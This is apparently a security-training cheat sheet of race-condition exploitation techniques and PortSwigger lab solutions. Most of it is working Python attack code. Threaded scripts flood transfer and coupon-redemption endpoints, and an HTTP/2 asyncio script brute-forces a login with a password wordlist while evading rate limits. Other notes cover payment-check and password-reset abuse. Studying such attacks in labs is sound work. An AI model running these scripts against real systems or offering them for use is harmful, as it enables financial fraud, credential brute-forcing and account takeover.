# Race Condition - Exploitation Techniques

## Basic Race Condition

### Concurrent Request Attack
```python
import threading
import requests

url = "https://target.com/api/transfer"
data = {"amount": 100, "to": "attacker"}

def send_request():
    requests.post(url, data=data, cookies={"session": "xxx"})

# Send 20 requests simultaneously
threads = [threading.Thread(target=send_request) for _ in range(20)]
for t in threads: t.start()
for t in threads: t.join()
```

### PortSwigger Lab - Limit Overrun
```
# Apply coupon code multiple times concurrently
POST /cart/coupon
coupon=SIGNUP30

# Send 20 concurrent requests with threading
# Each applies 30% discount, total discount exceeds 100%
```

## Time-of-Check to Time-of-Use (TOCTOU)

### File Race Condition
```
# Check if file exists, then read it
# Between check and read, file could be deleted/modified
# Attack: delete/modify file between check and read
```

### Database Race Condition
```
# Check balance, then deduct
# Between check and deduct, balance could change
# Attack: send concurrent deduction requests
```

## Detection Techniques

### Timing Analysis
```
# Send same request multiple times
# Measure response time variance
# High variance = potential race condition
```

### Concurrent Request Testing
```
# Send N identical requests simultaneously
# Compare responses for inconsistencies
# Different responses = confirmed race condition
```

## PortSwigger Lab Solutions

### Lab: Race condition - limit overrun
**Approach**: Redeem coupon multiple times
```
# Send multiple concurrent requests to redeem same coupon
# Use Burp Intruder or Turbo Intruder
# Or use Python threading
```

### Lab: Race condition - rate limit bypass
**Approach**: Send login attempts faster than rate limit
```
# Multiple concurrent requests during rate limit check window
# The counter increments after the check
```

### Lab: Race condition - payment bypass
**Approach**: Race between balance check and payment
```
# Concurrent requests:
# 1. Check balance
# 2. Process payment
# Both pass before balance is deducted
```

### Lab: Race condition - coupon reuse
**Approach**: Same coupon multiple times
```
# Send N concurrent requests with same coupon code
# Only 1 should succeed, but all pass validation
```

### Lab: Race condition - password reset
**Approach**: Multiple reset tokens
```
# Send concurrent password reset requests
# Each gets different token
# Use any valid token
```

## Python Race Condition Script
```python
import threading
import requests

url = "https://TARGET/api/redeem"
cookies = {"session": "VALUE"}
data = {"coupon": "CODE"}

def redeem():
    r = requests.post(url, cookies=cookies, json=data)
    print(f"Status: {r.status_code}, Body: {r.text[:100]}")

# Launch 10 concurrent requests
threads = []
for _ in range(10):
    t = threading.Thread(target=redeem)
    threads.append(t)
    t.start()

for t in threads:
    t.join()
```

## Burp Turbo Intruder
```
# Use turbo_intruder for maximum speed
# Queue requests with race=True
# Send all requests nearly simultaneously
```

## Verified Lab Solution: HTTP/2 Single-Packet Attack

**Lab #41** - SOLVED 2026-07-07

### Attack: Bypass Rate Limiting via HTTP/2 Multiplexing

**Why it works**: HTTP/2 multiplexes multiple requests on a single TCP connection. The server processes them nearly simultaneously, so the rate limiter's check-then-increment logic is defeated.

### Python Script (httpx + asyncio)
```python
import asyncio
import httpx

async def login(client, password, target, csrf_token, session_cookie):
    data = {
        "username": "carlos",
        "password": password,
        "csrf": csrf_token
    }
    cookies = {"session": session_cookie}
    r = await client.post(
        f"{target}/login",
        data=data,
        cookies=cookies,
        follow_redirects=False
    )
    if r.status_code == 302:
        print(f"[!] SUCCESS: {password}")
        return password
    return None

async def race_attack():
    target = "https://TARGET"
    passwords = ["123456", "password", "123123", "admin", ...]  # Your wordlist
    
    # Get fresh CSRF token and session
    # ...
    
    async with httpx.AsyncClient(http2=True, verify=False) as client:
        tasks = [login(client, pw, target, csrf, session) for pw in passwords]
        results = await asyncio.gather(*tasks)
        
    successful = [r for r in results if r]
    print(f"Found passwords: {successful}")

asyncio.run(race_attack())
```

### Key Insights
1. **HTTP/2 is critical**: Regular HTTP/1.1 with threading has too much latency
2. **Single TCP connection**: HTTP/2 multiplexes all requests on one connection
3. **asyncio.gather()**: Launches all requests "at once" 
4. **CSRF token**: Must be obtained fresh before the race
5. **Detection**: Look for 302 redirect (success) vs 200 (failure)

### Why Other Methods Fail
- **Threading + requests**: Sequential TCP connections = too slow
- **urllib3**: Same problem - connection setup adds jitter
- **HTTP/1.1**: Each request opens new connection, rate limiter catches early ones

### PortSwigger Reference
This is the "single-packet attack" from PortSwigger's Black Hat USA 2023 research.
